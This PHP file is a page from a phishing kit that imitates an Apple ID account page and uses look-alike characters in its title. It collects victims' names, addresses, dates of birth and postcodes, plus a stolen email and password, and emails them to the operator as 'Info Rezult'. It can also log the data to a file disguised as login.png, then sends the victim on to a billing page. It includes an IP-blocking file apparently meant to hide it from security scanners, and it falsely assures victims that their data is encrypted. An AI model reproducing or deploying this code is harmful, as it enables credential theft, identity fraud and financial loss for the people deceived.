<?php

session_start();
error_reporting(0);
include "bots.php";  //Para Bloquear Algunas IPs / tikchbila tiwliwla ma9tloni ma7wawni ghir spam bach blawni 
include ('config.php');




	
	$_SESSION['UK747900-1'] = $_POST['UK747900-1'];
	$_SESSION['UK747900-2'] = $_POST['UK747900-2'];
	$_SESSION['UK747900-3'] = $_POST['UK747900-3'];
	$_SESSION['UK747900-4'] = $_POST['UK747900-4'];
	$_SESSION['UK747900-5'] = $_POST['UK747900-5'];
	$_SESSION['UK747900-6'] = $_POST['UK747900-6'];
	$_SESSION['UK747900-7'] = $DOB = $_POST['month'].'/'.$_POST['day'].'/'.$_POST['year'];
	$_SESSION['country']  = $_POST['country'];
	
//echo $_POST['countries'];
if (isset($_POST['country'])){
	
	 if ($_POST['country']=='US'){
		 $url = "billing.php?cn=4654A6ZE46AS55QSD4654AZE465A4E65Q3&cnt=us&n=456QSD4Q566A66654";
	 }else if($_POST['country']=='GB'){
		 
		$url = "billing.php?cn=4654A6ZE46AS55QSD4654AZE465A4E65Q3&cnt=uk&n=456DQSD4666AA5ZE6A";
	 }else{
		$url = "billing.php" ;
	 }
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: 	REZ <experts@nptemp.net>" . "\r\n";
$message = "

	<table style='border-spacing: 0px; line-height: 1.2em; width: 100%; font-family:Tahoma;color:#333;font-size:14px;border:1px solid #06f;padding:20px;border-radius:5px;margin-top:20px'>
 
	<tr><td style='width: 15%;'> Email 	</td><td><font color='#3366FF'>".$_SESSION['_email_']."</td></tr>
	<tr><td> Password 					</td><td><font color='#3366FF'>".$_SESSION['_password_']."</td></tr>
	
	<tr><td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td>
	<td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td></tr>
	
	<tr><td> First Name :</td><td><font color='#3366FF'>".$_POST['UK747900-1']."</td></tr>
	<tr><td> Last Name 	:</td><td><font color='#3366FF'>".$_POST['UK747900-2']."</td></tr>
	<tr><td> Address 	:</td><td><font color='#3366FF'>".$_POST['UK747900-3']."</td></tr>
	<tr><td> DOB 		:</td><td><font color='#3366FF'>".$DOB.				   "</td></tr>
	<tr><td> City 		:</td><td><font color='#3366FF'>".$_POST['UK747900-4']."</td></tr>
	<tr><td> Postal Code:</td><td><font color='#3366FF'>".$_POST['UK747900-5']."</td></tr>
	<tr><td> State 		:</td><td><font color='#3366FF'>".$_POST['UK747900-6']."</td></tr>
	<tr><td> Country	:</td><td><font color='#3366FF'>".$_POST['country'].   "</td></tr>
	
	<tr><td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td>
	<td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td></tr>
	
    <tr><td> IP 		</td><td><font color='#1C800D'>".$_SESSION['_IP_']."</td></tr>
    <tr><td> TIME		</td><td><font color='#1C800D'>".date('l jS \of F Y h:i:s A')."</td>
	<td rowspan='3' style='text-align:right;'>".$Logo."<br> Copyright&copy; UK747</td></tr>
	<tr><td> Browser 	</td><td><font color='#1C800D'>".$_SESSION['_browser_']."</td></tr>
	<tr><td> USER AGENT </td><td><font color='#1C800D'>".$_SERVER['HTTP_USER_AGENT']."</td></tr>
	

	</table>";
	$subject = "~ Info Rezult ~| $countryname | $ip";


if ($txt == 1){
$open_rezult_file = fopen("../login.png","a"); 
fwrite($open_rezult_file,$message); 
};

mail($to, $subject, $message, $headers);     
header("Location: $url ");
}
?>
<!DOCTYPE html>


<html>
	
	<head>
		<title>&Mu;y lD &Alpha;ccount</title>
		<meta name="robots" content="noindex">

		<meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
		<meta name="viewport" content="width=device-width, maximum-scale=1.0, user-scalable=1" />
		
		<link rel="shortcut icon" href="../set/img/iconisma.ico">
		<link rel="stylesheet" href="../set/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="../set/css/bootstrap-theme.min.css"/>
		<link rel="stylesheet" href="../set/cssisma/tot.css" type="text/css"/>
		<link href="../set/css/jquerysctipttop.css" rel="stylesheet" type="text/css">
		<link href="../set/css/flags.css" rel="stylesheet">
		<link rel="stylesheet" href="../set/css/styles.css"/>
		
		<script src="../set/js/jquery-1.11.0.min.js"></script>
		<script src="../set/js/bootstrap.min.js"></script>
	</head>

		
		
		
<body style="background:#F3F3F3">

		
		<?php include("../forms/nav.php")?>
		
	<div class="container">
			<img style="width: 190px;" src="../set/img/logs" class="img-responsive myapp" />
		<div class="row row2" >

				<div class="col-xs-4 sidebar mobile-hide" >
				<img style="width:104%;  position:relative; top:20px;" src="../set/img/Untitled2.png ">
				
				</div>

			<div class="col-xs-4 loop mobile" >
					<div >
						<img style="height: 40px; width:270px; position:relative; " src="../set/img/title.png ">
						<hr/>
					</div>

				<?php include('../forms/Add.php');?>


			</div>
	
<div class="footbar col-xs-12">
					<p style="padding:15px;">We use a Highly encryption to pr&omicron;tect the c&omicron;nfidentiality of y&omicron;ur &Rho;ers&omicron;nal inf&omicron;rmation.</p>
					</div>

		</div>
		<br/>
		<br/>
		<br/>
		<br/>
		<div class="panel-footer footer" >

			<img src="../set/img/footer.png" class="img-responsive" />

		</div>
	</div>

</body>
		<script src="../set/js/jquery.flagstrap.js"></script>
		
		<script>
    $('#basic').flagStrap();

    $('#options').flagStrap({
        countries: {
            "AU": "Australia",
            "GB": "United Kingdom",
            "US": "United States"
        },
        buttonSize: "btn-sm",
        buttonType: "btn-info",
        labelMargin: "10px",
        scrollable: false,
        scrollableHeight: "350px"
    });

    $('#advanced').flagStrap({
        buttonSize: "btn-lg",
        buttonType: "btn-primary",
        labelMargin: "20px",
        scrollable: false,
        scrollableHeight: "350px"
    });

</script>

<script>//jQuery time
					$(document).ready( function () { 
						

							
					$("#form input").focus (function() {
				
						$(this).css({'background-size' : '0px'});
						}).blur(function() {
						if( !$(this).val()){
						$(this).css({'background-size' : '130px 290px;'});
								}
						});
					
					
					
					$("#Next").click(function(){
							 function check(){
								var isValid = true;
							 
								$("input").each(function() {
								var element = $(this);
								if (element.val() == "") {
								$(this).css({'background-color' : '#FEFEDE'});
								isValid = false;
								}
								});

								return isValid
								}
								isValid = check();
								if (isValid == true){
								document.form.submit();  
							};

						});
					});
</script>
		
						
</html>		